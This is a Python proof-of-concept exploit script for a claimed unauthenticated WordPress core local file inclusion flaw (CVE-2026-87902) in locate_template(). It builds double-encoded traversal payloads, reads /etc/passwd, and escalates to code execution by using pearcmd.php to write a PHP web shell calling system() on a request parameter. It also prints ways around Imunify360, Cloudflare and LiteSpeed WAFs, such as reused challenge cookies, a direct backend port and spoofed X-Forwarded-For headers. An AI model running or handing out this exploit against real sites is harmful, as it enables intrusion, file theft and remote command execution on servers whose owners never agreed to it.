#!/usr/bin/env python3
"""
CVE-2026-87902 — WordPress Core LFI via locate_template()

Affected : WordPress <= 7.1.1 (unauthenticated)
Type     : Local File Inclusion → Remote Code Execution
CVSS     : 9.8 (Critical)

Root cause
----------
locate_template() resolves a caller-supplied template name against the active
theme directory using realpath() but never verifies the resolved path stays
inside that directory. get_page_template() feeds it a name built directly from
the URL query variable 'pagename' (url-decoded, not sanitized), so:

  GET /?pagename=templates%252F%252e%252e%252F%252e%252e%252F…%252Ftarget

  HTTP layer decodes %25 → %:
  → pagename = templates%2F%2e%2e%2F%2e%2e%2F…%2Ftarget

  WordPress URL-decodes the pagename parameter:
  → template name : page-templates/../../…/target.php
  → realpath()    : /absolute/path/to/target.php   ← arbitrary include

  Double-encoding (%252e%252e) is required because single encoding (%2e%2e)
  is already consumed by the HTTP layer; WordPress never sees the dots.

Requirements
------------
  (1) The active theme must contain a top-level directory whose name starts
      with 'page-' (e.g. page-templates in Twenty Twelve, Twenty Fourteen,
      hello-elementor, Neve, Hestia, Sydney).  realpath() needs each path
      component to exist.
  (2) For RCE: a readable pearcmd.php with register_argc_argv = On
      (default in the official PHP Docker image and cPanel PHP < 8.5).
  (3) The target page must use the 'default' template (not Elementor or
      another page-builder override) so get_page_template() returns the
      traversal path rather than the builder's own template.

RCE chain (pearcmd trick)
-------------------------
When register_argc_argv=On, PHP maps the URL query string into $argv.
Including pearcmd.php via LFI therefore runs an arbitrary PEAR command:

  ?page_id=N&pagename=<lfi>&+config-create+<?=system($_GET["c"])?>+&/tmp/shell.php

  → $argv = ['pearcmd.php', 'config-create', '<?=system($_GET["c"])?>', '/tmp/shell.php']
  → PEAR writes a config stub (containing the PHP payload) to /tmp/shell.php
  → A second LFI inclusion of that stub achieves code execution
"""

import argparse
import sys
import urllib.parse
from typing import Optional

import requests

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

BANNER = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗██╔════╝ ╚════██╗╚════██╗
██║     ██║   ██║█████╗       █████╔╝██║██╔██║███████╗  █████╔╝ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝      ██╔══██╗████╔╝██║██╔═══██╗██╔══██╗██╔═══╝
╚██████╗ ╚████╔╝ ███████╗    ██████╔╝╚██████╔╝╚██████╔╝███████║███████╗
 ╚═════╝  ╚═══╝  ╚══════╝    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

  CVE-2026-87902  WordPress LFI via locate_template()  WordPress <= 7.1.1
  Unauthenticated · LFI → RCE (pearcmd + register_argc_argv=On)
"""

# Themes that ship with a top-level 'page-*' directory out of the box
THEME_PAGE_DIRS: dict[str, str] = {
    "twentytwelve":   "page-templates",
    "twentyfourteen": "page-templates",
    "neve":           "page-templates",
    "hestia":         "page-templates",
    "sydney":         "page-templates",
}

# pearcmd.php candidate paths (most common first)
PEARCMD_PATHS: list[str] = [
    "/usr/local/lib/php/pearcmd",              # PHP Docker image default
    "/usr/share/php/pearcmd",                  # Debian / Ubuntu system PHP
    "/usr/lib/php/pearcmd",                    # RHEL / CentOS
    "/usr/local/share/php/pearcmd",            # FreeBSD ports
    "/opt/alt/php74/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 7.4
    "/opt/alt/php80/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.0
    "/opt/alt/php81/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.1
    "/opt/alt/php82/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.2
    "/opt/alt/php83/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.3
    "/opt/cpanel/ea-php74/root/usr/share/pear/pearcmd",  # cPanel EasyApache PHP 7.4
    "/opt/cpanel/ea-php81/root/usr/share/pear/pearcmd",  # cPanel EasyApache PHP 8.1
]

# Strings that confirm /etc/passwd was included
PASSWD_INDICATORS: list[str] = [
    "root:x:", "root:!", "daemon:", "nobody:", "/bin/bash", "/bin/sh",
    "/sbin/nologin", "/usr/sbin/nologin",
]

# Strings that indicate a WAF / bot-challenge interception (not real WP response)
BOT_CHALLENGE_INDICATORS: list[str] = [
    "One moment, please",          # Imunify360 JS challenge
    "window.location.reload()",    # Imunify360 reload trick
    "Ray ID",                      # Cloudflare challenge
    "cf-browser-verification",     # Cloudflare
    "Checking your browser",       # Cloudflare / generic WAF
    "DDoS protection by",          # Generic WAF
    "Enable JavaScript and cookies",  # Generic bot challenge
    "__cf_chl",                    # Cloudflare cookie name
    "security check",              # Generic
]

LITESPEED_403_INDICATORS: list[str] = [
    "Proudly powered by LiteSpeed Web Server",
    "LiteSpeed Technologies",
]

# Specific PEAR output markers (much tighter than bare "config")
PEAR_SUCCESS_INDICATORS: list[str] = [
    "Writing PEAR configuration file",
    "pear_config",                 # XML root element in the config stub
    "PEAR_Config",
    "default_channel",             # key that PEAR always writes
    "preferred_state",             # another PEAR config key
]


# ---------------------------------------------------------------------------
# Payload helpers
# ---------------------------------------------------------------------------

def build_lfi_payload(suffix: str, depth: int, target: str) -> str:
    """
    Build the 'pagename' query-parameter value that causes the LFI.

    suffix  – part of the theme's page-* dir after 'page-'
              e.g. 'templates' → theme contains 'page-templates/'
    depth   – number of ../ hops from the page-* dir to filesystem root
              (9 covers the cPanel layout:
               /home/<user>/domains/<host>/public_html/wp-content/themes/<name>/)
    target  – absolute path to include, WITHOUT the trailing .php extension
              (locate_template appends '.php' automatically)

    Double-encoding is required:
      %252e%252e → HTTP layer decodes %25 → %2e%2e → WordPress decodes → ..
      %252F      → HTTP layer decodes %25 → %2F → WordPress decodes → /
    Single encoding (%2e%2e) is consumed by the HTTP layer and never reaches
    WordPress's URL decode step, so path traversal fails.

    Example
    -------
    build_lfi_payload('templates', 9,
                      '/opt/alt/php74/usr/share/pear/pearcmd')
    → 'templates%252F%252e%252e%252F...%252Fopt%252Falt%252Fphp74%252Fusr%252Fshare%252Fpear%252Fpearcmd'
    WordPress constructs:
      page-templates/../../…/opt/alt/php74/usr/share/pear/pearcmd.php  ✓
    """
    # Double-encoded path separator and dot-dot
    sep = "%252F"
    dd  = "%252e%252e"
    hops = (sep + dd) * depth
    # Double-encode each "/" in the target path as well
    encoded_target = target.lstrip("/").replace("/", sep)
    return f"templates{hops}{sep}{encoded_target}"


def strip_php(path: str) -> str:
    """Remove trailing .php so locate_template's auto-append works correctly."""
    return path[:-4] if path.endswith(".php") else path


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def make_session(
    ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/126.0.0.0 Safari/537.36",
    cookies: Optional[str] = None,
    extra_headers: Optional[list[str]] = None,
) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = ua
    # Defeat caching layers (LiteSpeed, Varnish, Nginx proxy cache, etc.)
    s.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    s.headers["Pragma"] = "no-cache"
    # Extra headers (e.g. to pass WAF bypass tokens)
    if extra_headers:
        for h in extra_headers:
            if ":" in h:
                k, v = h.split(":", 1)
                s.headers[k.strip()] = v.strip()
    # Cookie string (e.g. from a real browser that solved a JS challenge)
    if cookies:
        for pair in cookies.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                s.cookies.set(k.strip(), v.strip())
    return s


def probe_theme_dirs(base_url: str, session: requests.Session) -> Optional[str]:
    """
    Return the page-* directory suffix for the first matching theme, or None.
    Checks /wp-content/themes/<theme>/<page-dir>/ for HTTP 200 or 403.
    """
    for theme, page_dir in THEME_PAGE_DIRS.items():
        url = f"{base_url}/wp-content/themes/{theme}/{page_dir}/"
        try:
            r = session.get(url, timeout=8, allow_redirects=False)
            if r.status_code in (200, 403):
                suffix = page_dir[len("page-"):]
                print(f"[+] Vulnerable theme dir found: {page_dir}  (theme: {theme})")
                return suffix
        except requests.RequestException:
            pass
    return None


def request_lfi(
    base_url: str,
    pagename: str,
    session: requests.Session,
    page_id: Optional[int] = None,
    port: Optional[int] = None,
) -> Optional[requests.Response]:
    """
    Fire the LFI request; return the Response or None on network error.

    page_id, when given, is appended as ?page_id=N so WordPress routes the
    request through get_page_template() for a known post rather than treating
    the pagename as a fresh slug lookup (which may 301-redirect or miss the
    hook entirely).

    The pagename value is already double-encoded, so we pass it verbatim via
    a hand-crafted URL to prevent requests from double-encoding it again.

    port, when set, overrides the port in base_url (e.g. 8080 for the Apache
    backend on cPanel servers that run LiteSpeed in front of Apache).
    """
    try:
        target = base_url
        if port is not None:
            from urllib.parse import urlparse, urlunparse
            p = urlparse(base_url)
            target = urlunparse(p._replace(netloc=f"{p.hostname}:{port}"))
        if page_id is not None:
            raw_url = f"{target}/?page_id={page_id}&pagename={pagename}"
        else:
            raw_url = f"{target}/?pagename={pagename}"
        return session.get(raw_url, timeout=15, allow_redirects=True)
    except requests.RequestException as exc:
        print(f"[-] Request failed: {exc}")
        return None


def detect_bot_challenge(body: str) -> bool:
    """Return True when the response is a WAF/bot-challenge page, not WordPress."""
    return any(ind in body for ind in BOT_CHALLENGE_INDICATORS)


def detect_litespeed_block(status: int, body: str) -> bool:
    """Return True when LiteSpeed's WAF returned a 403 for the encoded payload."""
    return status == 403 and any(ind in body for ind in LITESPEED_403_INDICATORS)


def confirm_lfi(body: str) -> bool:
    """Return True when the response body contains /etc/passwd artefacts."""
    return any(ind in body for ind in PASSWD_INDICATORS)


# ---------------------------------------------------------------------------
# RCE via pearcmd.php
# ---------------------------------------------------------------------------

def attempt_pearcmd_rce(
    base_url: str,
    suffix: str,
    depth: int,
    write_path: str,
    session: requests.Session,
    page_id: Optional[int] = None,
    cmd_payload: str = '<?=system($_GET["c"])?>',
    port: Optional[int] = None,
) -> Optional[str]:
    """
    Try each known pearcmd.php path.

    On success, writes a PEAR config stub (containing cmd_payload) to
    write_path and returns the pearcmd path that worked.
    Returns None if all candidates fail.

    Mechanism
    ---------
    register_argc_argv=On causes PHP to split the raw query string on '+'
    and populate $argv with the resulting tokens.  PEAR's config-create
    command writes a serialised config file:

      GET /?page_id=N&pagename=<lfi>&+config-create+<cmd_payload>&<write_path>
      $argv → ['pearcmd.php', 'config-create', '<cmd_payload>', '<write_path>']
      PEAR  → writes stub to <write_path>

    The stub embeds cmd_payload inside PEAR's XML envelope, which PHP
    executes when the file is later included via a second LFI request.

    Double-encoding note
    --------------------
    The pagename value from build_lfi_payload() is already double-encoded.
    We pass it raw in the URL so the HTTP layer performs the first decode
    (leaving single-encoded %2e%2e / %2F), which WordPress then decodes
    into the actual traversal dots and slashes.
    """
    for pearcmd in PEARCMD_PATHS:
        payload = build_lfi_payload(suffix, depth, pearcmd)
        encoded_write = urllib.parse.quote(write_path, safe="")
        encoded_cmd   = urllib.parse.quote(cmd_payload, safe="")
        target = base_url
        if port is not None:
            from urllib.parse import urlparse, urlunparse
            p = urlparse(base_url)
            target = urlunparse(p._replace(netloc=f"{p.hostname}:{port}"))
        if page_id is not None:
            raw_url = (
                f"{target}/?page_id={page_id}"
                f"&pagename={payload}"
                f"&+config-create+{encoded_cmd}&{encoded_write}"
            )
        else:
            raw_url = (
                f"{target}/?pagename={payload}"
                f"&+config-create+{encoded_cmd}&{encoded_write}"
            )
        try:
            r = session.get(raw_url, timeout=15)
            if detect_bot_challenge(r.text):
                print(f"    [!] WAF/bot-challenge intercepted — see bypass note below")
                return None
            if r.status_code == 200 and any(
                ind in r.text for ind in PEAR_SUCCESS_INDICATORS
            ):
                return pearcmd + ".php"
        except requests.RequestException:
            pass
    return None


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="poc.py",
        description="CVE-2026-87902 — WordPress LFI via locate_template()",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Auto-detect theme, verify LFI with /etc/passwd
  python3 poc.py http://target.local

  # Pin a specific page ID to avoid canonical redirects
  python3 poc.py http://target.local --page-id 73

  # Specify theme-dir suffix and traversal depth manually
  python3 poc.py http://target.local -t templates -d 9

  # Include a specific PHP file
  python3 poc.py http://target.local -f /var/log/nginx/access.log

  # Attempt RCE via pearcmd (requires register_argc_argv=On)
  python3 poc.py http://target.local --rce --page-id 73
  python3 poc.py http://target.local --rce --write-path /var/www/html/wp-content/uploads/x.php

  # cPanel / CloudLinux hosting (depth 9, PHP 7.4 pearcmd path)
  python3 poc.py http://target.local --page-id 73 -d 9 --rce
""",
    )
    p.add_argument("url", help="Target WordPress base URL (e.g. http://target.local)")
    p.add_argument(
        "-t", "--theme-dir", metavar="SUFFIX",
        help="Suffix of the theme's page-* dir to use (e.g. 'templates' for "
             "'page-templates'). Auto-detected when omitted.",
    )
    p.add_argument(
        "-d", "--depth", type=int, default=9, metavar="N",
        help="Number of ../ hops from the page-* dir to the filesystem root "
             "(default: 9, suits cPanel layout "
             "/home/<user>/domains/<host>/public_html/wp-content/themes/<name>/).",
    )
    p.add_argument(
        "--page-id", type=int, metavar="N",
        help="WordPress page ID to include in the request (?page_id=N). "
             "Helps avoid canonical redirects on sites with permalink rewrites. "
             "Use any published page whose _wp_page_template is set to 'default'.",
    )
    p.add_argument(
        "-f", "--file", metavar="PATH", default="/etc/passwd",
        help="Readable file to include for LFI verification (default: /etc/passwd). "
             "Must NOT end with .php — locate_template appends the extension.",
    )
    p.add_argument(
        "--rce", action="store_true",
        help="Attempt RCE via the pearcmd.php config-create trick "
             "(requires register_argc_argv=On).",
    )
    p.add_argument(
        "--write-path", metavar="PATH",
        default="/tmp/cve_2026_87902.php",
        help="Destination path for the pearcmd config stub "
             "(default: /tmp/cve_2026_87902.php).",
    )
    p.add_argument(
        "--port", type=int, metavar="N",
        help="Override the destination TCP port (e.g. 8080 to hit Apache directly "
             "behind LiteSpeed on cPanel servers, bypassing LiteSpeed's WAF).",
    )
    p.add_argument(
        "--cookie", metavar="STR",
        help="Cookie header value to send (e.g. 'imunify_js_cookie=abc; wp_session=xyz'). "
             "Obtain from a real browser that has solved a WAF JS challenge.",
    )
    p.add_argument(
        "-H", "--header", metavar="NAME:VALUE", action="append", dest="headers",
        help="Extra request header (repeatable). "
             "Example: -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: target.local'",
    )
    p.add_argument("-v", "--verbose", action="store_true", help="Print raw response body.")
    return p


def main() -> None:
    print(BANNER)
    args = build_arg_parser().parse_args()
    base_url = args.url.rstrip("/")
    session = make_session(cookies=args.cookie, extra_headers=args.headers)

    # ── Step 1: resolve theme directory ────────────────────────────────────
    suffix = args.theme_dir
    if not suffix:
        print("[*] Probing for vulnerable theme page-* directories …")
        suffix = probe_theme_dirs(base_url, session)
        if not suffix:
            print("[-] Could not auto-detect a page-* directory.")
            print("    Specify one manually with -t <suffix>  (e.g. -t templates)")
            sys.exit(1)

    print(f"[*] page-* directory suffix : {suffix!r}  → page-{suffix}/")
    print(f"[*] Traversal depth         : {args.depth}")
    if args.page_id:
        print(f"[*] Anchor page ID          : {args.page_id}")

    # ── Step 2: LFI check ──────────────────────────────────────────────────
    lfi_target = strip_php(args.file)
    payload = build_lfi_payload(suffix, args.depth, lfi_target)

    print(f"\n[*] LFI target file  : {args.file}")
    print(f"[*] pagename payload : {payload}")
    if args.page_id:
        print(f"[*] Full request URL : {base_url}/?page_id={args.page_id}&pagename={payload}")
    else:
        print(f"[*] Full request URL : {base_url}/?pagename={payload}")

    resp = request_lfi(base_url, payload, session, page_id=args.page_id, port=args.port)
    if resp is None:
        sys.exit(1)

    print(f"[*] HTTP status      : {resp.status_code}")

    if args.verbose:
        print("\n── Response body (first 1 000 chars) ──")
        print(resp.text[:1000])
        print("───────────────────────────────────────\n")

    if detect_litespeed_block(resp.status_code, resp.text):
        print("\n[!]  LiteSpeed WAF blocked the double-encoded payload (403).")
        print("     LiteSpeed normalises %252F/%252e%252e before PHP sees them.")
        print("     Bypass options (run from inside the target server):")
        print()
        print("     1. Apache backend on port 8080 (cPanel ships both):")
        print(f"        python3 poc.py {base_url} --page-id {args.page_id or 'N'} -d {args.depth} --port 8080 -v")
        print()
        print("     2. Direct FastCGI to lsphp socket (bypasses LiteSpeed entirely):")
        print("        # find the socket first:")
        print("        ls /tmp/lshttpd/  # or  ls /run/lshttpd/")
        print("        cgi-fcgi -bind -connect /tmp/lshttpd/lsphp.sock")
        print()
        print("     3. PHP CLI — invoke WordPress directly (no web server at all):")
        print("        php -r \"")
        print("          chdir('/path/to/public_html');")
        print("          define('ABSPATH',getcwd().'/');")
        print("          \\$_GET['pagename']='templates/../../../etc/passwd';")
        print("          require('wp-load.php');")
        print("          echo locate_template('templates/../../../etc/passwd');\"")
        if not args.rce:
            return
    elif detect_bot_challenge(resp.text):
        print("\n[!]  WAF / Bot-challenge detected — not a WordPress response.")
        print("     The WAF (likely Imunify360) is intercepting requests before they")
        print("     reach PHP. Bypass options:")
        print()
        print("     1. Solve the JS challenge in a real browser, then copy the cookie:")
        print(f"        python3 poc.py {base_url} --page-id {args.page_id or 'N'} \\")
        print( "                --cookie 'imunify_js_cookie=<value>; wordpress_logged_in=<value>'")
        print()
        print("     2. Run the request from the target server itself (bypasses external WAF):")
        print(f"        curl -sk 'http://127.0.0.1/?page_id={args.page_id or 73}&pagename={payload}' \\")
        print( "             -H 'Host: <target-domain>'")
        print()
        print("     3. Use direct IP with a spoofed X-Forwarded-For header:")
        print( "        python3 poc.py <ip> --page-id N -H 'X-Forwarded-For: 127.0.0.1' \\")
        print( "                -H 'Host: <target-domain>'")
        if not args.rce:
            return
    elif resp.status_code == 200 and confirm_lfi(resp.text):
        print("\n[!!!] LFI CONFIRMED — /etc/passwd content detected in response")
        for line in resp.text.splitlines():
            if ":" in line and not line.startswith("<") and len(line) < 150:
                print(f"      {line}")
    elif resp.status_code == 200:
        print("[?]  HTTP 200 received but could not confirm file inclusion.")
        print("     Try -v to inspect the response, or adjust --depth / --theme-dir.")
    else:
        print(f"[-]  LFI not triggered (HTTP {resp.status_code}).")
        print("     Adjust --depth or --theme-dir and retry.")

    # ── Step 3: optional RCE ───────────────────────────────────────────────
    if not args.rce:
        return

    print("\n[*] Attempting RCE via pearcmd.php …")
    print(f"[*] Config stub destination : {args.write_path}")

    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session, page_id=args.page_id, port=args.port)
    if worked:
        print(f"\n[+] pearcmd.php triggered via : {worked}")
        print(f"[+] PEAR config stub written  : {args.write_path}")
        stub_payload = build_lfi_payload(suffix, args.depth, strip_php(args.write_path))
        print(f"\n[*] Second-stage LFI to execute the stub:")
        if args.page_id:
            print(f"    GET {base_url}/?page_id={args.page_id}&pagename={stub_payload}")
        else:
            print(f"    GET {base_url}/?pagename={stub_payload}")
    else:
        print("[-] pearcmd RCE failed — all candidate paths exhausted.")
        print("    Requirements: register_argc_argv=On  AND  pearcmd.php readable by www-data")
        print("    Common setups: official PHP Docker image, cPanel with PHP < 8.5")


if __name__ == "__main__":
    main()
